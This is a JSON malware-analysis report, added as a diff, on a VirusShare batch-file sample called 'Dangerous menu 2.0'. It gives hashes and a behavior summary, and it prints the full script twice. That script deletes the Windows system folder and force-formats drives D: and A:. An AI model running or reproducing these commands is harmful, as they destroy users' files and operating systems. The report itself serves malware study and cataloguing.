@@ -1,0 +1,69 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "system": "May run an executable file or a system command on a Mac",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "@echo off\n:menu\necho                      Created by DVL\necho                Welcome 2 Dangerous menu 2.0\necho.\necho.\necho    MENU\necho    ====\necho.\necho    1 - Delete files from system folder\necho    2 - Format drive d\necho    3 - Format drive a\necho    4 - Restart computer\necho.\necho    Q - Quit\nchoice /c:1234Q>nul\nif errorlevel 5 goto done\nif errorlevel 4 goto Restart computer\nif errorlevel 3 goto Format drive a\nif errorlevel 2 goto Format drive d\nif errorlevel 1 goto Delete files from system folder\necho CHOICE missing\ngoto done\n\n:Delete files from system folder\ndeltree/y c:\\windows\\system\\*.*\ngoto done\n\n:Format drive d\nformat d:/q/u/autotest\ngoto menu\n\n:Format drive a\nformat a:/q/u/autotest\ngoto menu\n\n:Restart computer\nShutdown /RESTART\n\n:done\ncls"
+    },
+    "filename": "VirusShare_baa34c17b6bb004789955d628363ccb8",
+    "filesize": 802,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "baa34c17b6bb004789955d628363ccb8",
+        "sha1": "ee2cfbdcf28d3d9977a3a2caf5fea58df1864c99",
+        "sha256": "dca1493f076e448fcced9f9cfb2c89bd08ed49cd9d4be125b0e8393f1db8d580"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            ":menu",
+            "echo                      Created by DVL",
+            "echo                Welcome 2 Dangerous menu 2.0",
+            "echo.",
+            "echo.",
+            "echo    MENU",
+            "echo    ====",
+            "echo.",
+            "echo    1 - Delete files from system folder",
+            "echo    2 - Format drive d",
+            "echo    3 - Format drive a",
+            "echo    4 - Restart computer",
+            "echo.",
+            "echo    Q - Quit",
+            "choice /c:1234Q>nul",
+            "if errorlevel 5 goto done",
+            "if errorlevel 4 goto Restart computer",
+            "if errorlevel 3 goto Format drive a",
+            "if errorlevel 2 goto Format drive d",
+            "if errorlevel 1 goto Delete files from system folder",
+            "echo CHOICE missing",
+            "goto done",
+            ":Delete files from system folder",
+            "deltree/y c:\\windows\\system\\*.*",
+            "goto done",
+            ":Format drive d",
+            "format d:/q/u/autotest",
+            "goto menu",
+            ":Format drive a",
+            "format a:/q/u/autotest",
+            "goto menu",
+            ":Restart computer",
+            "Shutdown /RESTART",
+            ":done"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.272135",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
